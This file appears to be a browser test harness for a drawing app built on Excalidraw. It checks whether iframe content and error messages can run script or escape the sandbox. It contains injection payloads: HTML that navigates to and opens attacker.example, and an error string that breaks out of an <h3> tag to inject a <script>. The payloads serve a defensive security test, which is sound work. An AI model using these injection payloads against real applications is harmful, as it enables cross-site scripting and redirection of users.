import { createRoot } from "react-dom/client";
import { Excalidraw, restore } from "@excalidraw/excalidraw";
import "@excalidraw/excalidraw/index.css";

// Same load path as web/src/App.tsx: JSON.parse the drawing, then restore().
window.__macdrawMessages = [];
window.addEventListener("message", (event) => {
  window.__macdrawMessages.push(event.data);
});
const iframeLoads = new MutationObserver(() => {
  for (const frame of document.querySelectorAll("iframe")) {
    if (frame.dataset.watched) continue;
    frame.dataset.watched = "1";
    frame.addEventListener("load", () => {
      window.__macdrawMessages.push({ macdrawTest: "iframe-load" });
    });
  }
});
iframeLoads.observe(document.documentElement, { childList: true, subtree: true });

const which = new URLSearchParams(location.search).get("case") || "done";

const doneHTML = `<!DOCTYPE html><html><body><script>
parent.postMessage({macdrawTest:"done-script", href: location.href}, "*");
try {
  location.assign("https://attacker.example/from-iframe");
  parent.postMessage({macdrawTest:"assign-returned", href: location.href}, "*");
} catch (error) {
  parent.postMessage({macdrawTest:"assign-threw", error: String(error)}, "*");
}
setTimeout(() => parent.postMessage({macdrawTest:"href-later", href: location.href}, "*"), 400);
try {
  const popup = window.open("smb://attacker.example/popup");
  parent.postMessage({macdrawTest:"popup", opened: popup !== null}, "*");
} catch (error) {
  parent.postMessage({macdrawTest:"popup-threw", error: String(error)}, "*");
}
</script></body></html>`;

// Breaks out of the <h3> Excalidraw wraps an error message in. See renderEmbeddables.
const errorMessage = `</h3><script>
parent.postMessage({macdrawTest:"error-script"}, "*");
try {
  location.assign("https://attacker.example/from-error");
  parent.postMessage({macdrawTest:"error-assign-returned"}, "*");
} catch (error) {
  parent.postMessage({macdrawTest:"error-assign-threw", error: String(error)}, "*");
}
</script>`;

const base = {
  id: "frame-1",
  x: 80,
  y: 80,
  width: 480,
  height: 320,
  angle: 0,
  strokeColor: "#1e1e1e",
  backgroundColor: "transparent",
  fillStyle: "solid",
  strokeWidth: 2,
  strokeStyle: "solid",
  roughness: 1,
  opacity: 100,
  groupIds: [],
  frameId: null,
  roundness: null,
  seed: 1,
  version: 2,
  versionNonce: 1,
  isDeleted: false,
  boundElements: [],
  updated: 1,
  link: null,
  locked: false,
};

let element;
if (which === "error") {
  element = {
    ...base,
    type: "iframe",
    customData: { generationData: { status: "error", code: "ERR_OAI", message: errorMessage } },
  };
} else if (which === "embed") {
  element = { ...base, type: "embeddable", link: "https://attacker.example/not-allowed" };
} else {
  element = {
    ...base,
    type: "iframe",
    customData: { generationData: { status: "done", html: doneHTML } },
  };
}

const scene = {
  type: "excalidraw",
  version: 2,
  source: "MacDraw",
  elements: [element],
  appState: { viewBackgroundColor: "#ffffff", gridSize: 20 },
  files: {},
};

const restored = restore(JSON.parse(JSON.stringify(scene)), null, null, { repairBindings: true });
window.__restoredGeneration = restored.elements[0]?.customData?.generationData ?? null;
window.__restoredType = restored.elements[0]?.type ?? null;
window.__restoredLink = restored.elements[0]?.link ?? null;

createRoot(document.getElementById("root")).render(
  <div style={{ height: "100%", width: "100%" }}>
    <Excalidraw
      initialData={{
        elements: restored.elements,
        appState: { ...restored.appState },
        files: restored.files,
      }}
    />
  </div>
);
